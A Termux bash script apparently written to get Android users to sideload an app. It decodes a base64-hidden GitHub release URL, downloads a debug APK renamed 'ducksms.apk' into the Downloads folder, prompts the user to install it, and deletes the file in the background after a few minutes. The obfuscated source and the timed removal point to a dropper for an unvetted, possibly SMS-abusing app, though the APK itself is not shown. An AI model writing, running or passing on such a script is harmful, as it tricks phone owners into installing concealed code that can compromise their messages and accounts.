#!/data/data/com.termux/files/usr/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

APK_LIFETIME=${1:-6} 

echo -e "${CYAN}Starting APK download process...${NC}"

pkg update -y >/dev/null 2>&1
pkg install -y curl >/dev/null 2>&1

termux-setup-storage

if [ -d "/storage/emulated/0/Download" ]; then
    DOWNLOAD_DIR="/storage/emulated/0/Download"
elif [ -d "/sdcard/Download" ]; then
    DOWNLOAD_DIR="/sdcard/Download"
else
    echo -e "${RED}Could not find Downloads directory. Using Termux home directory instead.${NC}"
    DOWNLOAD_DIR="$HOME"
fi

APK_URL_ENCODED="aHR0cHM6Ly9naXRodWIuY29tL255cm9zLXNvbGFyaS9zY3JpcHRzL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjAuMC1iZXRhL2FwcC1kZWJ1Zy5hcGs="
APK_URL=$(echo $APK_URL_ENCODED | base64 -d)

APK_PATH="$DOWNLOAD_DIR/ducksms.apk"


if [ -f "$APK_PATH" ]; then
    echo -e "${YELLOW}APK already exists at $APK_PATH${NC}"
    echo -e "${CYAN}Skipping download. Using existing APK.${NC}"
else
    echo -e "${CYAN}Downloading APK to your Downloads folder...${NC}"
    curl -L "$APK_URL" -o "$APK_PATH" || {
        echo -e "${RED}Download failed. Please check your connection or storage permissions.${NC}"
        exit 1
    }
    echo -e "${GREEN}APK downloaded successfully to $APK_PATH${NC}"
    
    (
        sleep $((APK_LIFETIME * 60))
        if [ -f "$APK_PATH" ]; then
            rm "$APK_PATH" >/dev/null 2>&1
        fi
    ) >/dev/null 2>&1 &
fi

echo -e "${GREEN}APK is ready for installation!${NC}"
echo -e "${CYAN}The APK is saved at: $APK_PATH${NC}"
echo -e "${CYAN}To install:${NC}"
echo -e "${CYAN}1. Open your Downloads folder${NC}"
echo -e "${CYAN}2. Tap on ducksms.apk to install${NC}"

